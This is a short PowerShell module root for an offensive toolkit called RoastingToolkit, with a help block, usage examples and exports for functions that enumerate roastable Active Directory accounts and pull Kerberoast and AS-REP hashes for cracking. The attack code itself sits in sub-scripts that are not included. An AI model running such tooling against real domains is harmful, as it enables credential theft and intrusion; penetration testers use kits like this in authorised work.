<#
.SYNOPSIS
    RoastingToolkit — Quick Kerberoasting & AS-REP Roasting from Windows.

.DESCRIPTION
    Modular toolkit for enumerating roastable accounts, extracting
    Kerberoast TGS hashes, and harvesting AS-REP responses.

    Supports Rubeus.exe and PowerView as backends.

.EXAMPLE
    Import-Module .\RoastingToolkit
    Find-RoastableAccounts
    Invoke-QuickKerberoast -OutputDir C:\Temp\Roast
    Invoke-QuickASREPRoast -OutputDir C:\Temp\Roast
#>

# Dot-source sub-modules
. "$PSScriptRoot\Enumeration\Find-RoastableAccounts.ps1"
. "$PSScriptRoot\Kerberoast\Invoke-QuickKerberoast.ps1"
. "$PSScriptRoot\ASREPRoast\Invoke-QuickASREPRoast.ps1"

# Explicit exports
Export-ModuleMember -Function @(
    'Find-RoastableAccounts',
    'Invoke-QuickKerberoast',
    'Invoke-QuickASREPRoast'
)